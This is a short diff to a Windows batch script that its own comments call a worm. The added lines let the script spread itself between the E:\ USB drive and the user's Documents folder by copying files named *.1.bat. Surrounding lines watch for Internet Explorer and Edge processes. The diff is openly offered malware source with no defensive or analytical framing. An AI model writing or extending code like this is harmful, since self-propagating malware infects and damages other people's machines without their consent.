@@ -30,7 +30,13 @@ if "%ERRORLEVEL%"=="0" goto yesie
 tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "MicrosoftEdge.exe">NUL
 if "%ERRORLEVEL%"=="0" goto yesedge
 
-::worm copying to external drives
+REM worm copying to external drives
+::if on usb copy to desktop
+if exist "C:\Users\%username%\Documents\*.1.bat" goto pass1
+if /i "%CD:~0,3%" EQU "E:\" goto copyfromusb
+:pass1
+
+::if on desktop copy to usb
 if not exist "E:\" goto loop
 if exist "E:\*.1.bat" goto loop
 
@@ -80,6 +86,12 @@ tasklist /FI "IMAGENAME eq MicrosoftEdge.exe" 2>NUL | find /I /N "MicrosoftEdge.
 if "%ERRORLEVEL%"=="0" goto waitedge
 timeout /t 0 >nul
 set /a okay=0
+goto loop
+
+:copyfromusb
+for /r %%f in (*.1.bat) do (
+type %%~nxf >>"C:\Users\%username%\Documents\%%~nxf"
+)
 goto loop
 
 ::security stuff
